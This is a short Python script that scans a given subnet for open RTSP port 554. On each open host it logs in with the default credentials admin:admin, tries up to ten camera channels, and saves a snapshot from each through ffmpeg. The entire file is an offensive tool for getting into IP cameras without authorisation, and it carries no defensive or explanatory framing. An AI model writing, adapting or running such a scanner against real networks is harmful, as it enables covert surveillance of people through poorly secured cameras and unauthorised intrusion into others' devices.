#!/usr/bin/python3
'''
NEW RSTP PROJECT
05/02/2017 by borrachinha
'''

def openPort(target):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.20)
    result = sock.connect_ex((target, 554))
    sock.close()

    if result == 0:
        print(target + " - OPEN")
        listIP.append(result)
        exploitRstp(target)

def exploitRstp(ip):
    cam = 'cam-' + ip + '.jpeg'
    for i in range(10):
        command = ("rtsp://admin:admin@{0}:554/cam/realmonitor?channel={1}&subtype=0".format(ip, i+1))
        subprocess.Popen(['/usr/bin/ffmpeg', '-i', command, '-f', 'image2', cam], stdout=subprocess.PIPE)

if __name__ == '__main__':
    try:
        import sys
        import socket
        import ipcalc
        import subprocess
        import re

        if len(sys.argv) < 2 or '--help' in sys.argv:
            print("--target     Set target with netmask Ex:\n"
                  "             --target 192.168.0.1/24")

        elif '--target' in sys.argv:
            print(sys.argv)
            network = re.findall(r'[0-9\.\/]+', str(sys.argv))
            print(network)
            for ip in ipcalc.Network(network[0]):
                openPort(ip)

    except Exception as err:
        print("Option unknow\nTry --help")
        print(err)